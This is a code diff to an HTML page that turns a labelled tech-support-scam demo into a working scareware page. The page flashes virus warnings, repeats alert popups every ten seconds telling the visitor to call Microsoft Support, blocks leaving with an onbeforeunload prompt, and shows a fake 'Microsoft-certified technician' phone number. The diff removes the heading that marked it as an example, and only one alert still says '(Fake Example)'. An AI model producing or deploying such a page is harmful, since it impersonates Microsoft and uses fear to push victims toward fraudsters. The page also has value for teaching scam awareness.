@@ -3,15 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upozornění!(1)</title>
-    <script>
-        function showScamPopup() {
-            alert("VAROVÁNÍ!! VÁŠ POČÍTAČ JE NAPADEN! NEZAVÍREJTE STRÁNKU!");
+    <title>⚠ URGENT: Virus Alert!</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
         }
+        .warning {
+            font-size: 24px;
+            font-weight: bold;
+            border: 3px solid red;
+            padding: 20px;
+            display: inline-block;
+            background-color: yellow;
+            color: black;
+            animation: flash 0.5s infinite alternate;
+        }
+        @keyframes flash {
+            0% { background-color: yellow; }
+            100% { background-color: red; }
+        }
+        .details {
+            font-size: 18px;
+            margin-top: 20px;
+        }
+        .call-now {
+            font-size: 22px;
+            font-weight: bold;
+            background-color: red;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 30px;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        function showPopups() {
+            alert("WARNING! Your PC is infected! Call Microsoft Support Now!");
+            alert("Your system has been blocked due to suspicious activity.");
+        }
+        
+        function preventClose(event) {
+            event.preventDefault();
+            event.returnValue = "Your computer is at risk! Are you sure you want to leave?";
+        }
+
+        function blockExit() {
+            setTimeout(function() {
+                window.open("fake_antivirus.html", "_blank");
+            }, 2000);
+        }
+
+        window.onload = function() {
+            showPopups();
+            setInterval(showPopups, 10000); // Repeat pop-ups every 10 seconds
+            window.onbeforeunload = preventClose; // Prevents closing the page easily
+        };
     </script>
 </head>
-<body onload="showScamPopup()">
-    <h2>Tech Support Scam Example</h2>
-    <p>This page mimics a fake virus warning.</p>
+<body>
+    <h1 class="warning">⚠ WARNING: YOUR COMPUTER IS INFECTED! ⚠</h1>
+    <p class="details">Your Windows system is infected with (3) viruses! Your personal data, passwords, and banking information are at risk.</p>
+    <p class="details">Click below to speak to a Microsoft-certified technician immediately.</p>
+    <div class="call-now" onclick="alert('Calling... (Fake Example)')">📞 Call Now: +1 (800) 123-4567</div>
 </body>
 </html>
